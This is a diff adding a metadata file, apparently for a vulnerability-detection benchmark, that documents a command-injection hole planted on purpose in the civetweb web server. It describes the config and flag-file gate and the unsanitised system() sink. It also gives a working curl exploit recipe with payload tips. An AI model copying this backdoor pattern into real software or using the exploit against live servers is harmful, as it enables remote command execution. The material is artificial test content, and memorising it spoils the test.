@@ -1,0 +1,52 @@
+PACKAGE:     civetweb
+COMMIT:      3c0fb6ad582224b91959caf79a25dd98389c084d
+SOURCE:      /home/ubuntu/anthropic/corpus/civetweb/
+AXES:        C3 I2 S1
+
+DESCRIPTION:
+  Config-file + runtime-state gated command injection in civetweb. The server
+  reads exec_mode and exec_secret from a config file. A /exec/init?token=
+  endpoint must be called first to create a flag file. The cmd parameter is
+  wrapped in "sh -c '...' 2>/dev/null" (I2) with no sanitization (S1).
+
+CONFIG_GATE (C3 -- config file + runtime state):
+  mechanism:  Key=value config file parsed by read_exec_config() into
+              exec_cfg {enabled, secret}. exec_init_handler() validates
+              token and creates EXEC_INIT_FLAG (/tmp/civetweb_exec_init_151).
+              exec_initialized() checks stat(EXEC_INIT_FLAG).
+  check:      exec_handler() returns 404 unless exec_cfg.enabled && exec_initialized()
+  complexity: requires modelling both fopen->fgets->sscanf data flow AND
+              inter-request state (flag file existence)
+
+INPUT_FLOW (I2 -- buffered):
+  entry:      HTTP GET /exec?cmd=<payload>  ->  ri->query_string
+  path:       exec_handler() snprintf(shell_cmd, ..., "sh -c '%s' 2>/dev/null", qs+4)
+              system(shell_cmd)
+  transforms: one snprintf buffer wrapping in sh -c
+
+SANITIZATION (S1 -- none):
+  none
+
+SINK:        system(shell_cmd) in exec_handler() (src/main.c)
+
+CHANGED FILES:
+  src/main.c -- 4 hunks:
+    1. globals:  added exec_cfg struct + exec_initialized() + read_exec_config()
+    2. handler:  new exec_init_handler() + exec_handler() with I2/S1
+    3. prescan:  prescan_exec_args() strips --config PATH
+    4. start:    prescan call + mg_set_request_handler() for /exec/init and /exec
+
+EXPLOIT:
+  build:   bash build.sh
+  start:   ./civetweb --config /tmp/poc_151.conf -listening_ports 18151 -document_root /tmp
+  config:  exec_mode = 1\nexec_secret = s3cr3t
+  init:    curl 'http://127.0.0.1:18151/exec/init?token=s3cr3t'
+  trigger: curl 'http://127.0.0.1:18151/exec?cmd=id>/tmp/poc_151_marker'
+  verify:  cat /tmp/poc_151_marker
+
+  gate bypass: config with exec_mode=0; /exec/init returns 403, flag file
+               never created, exec_initialized() returns 0, /exec -> 404.
+
+NOTES:
+  system() output goes to server stderr; use write-to-file payloads.
+  I2 wraps cmd in "sh -c '%s' 2>/dev/null"; payload must not contain single quotes.
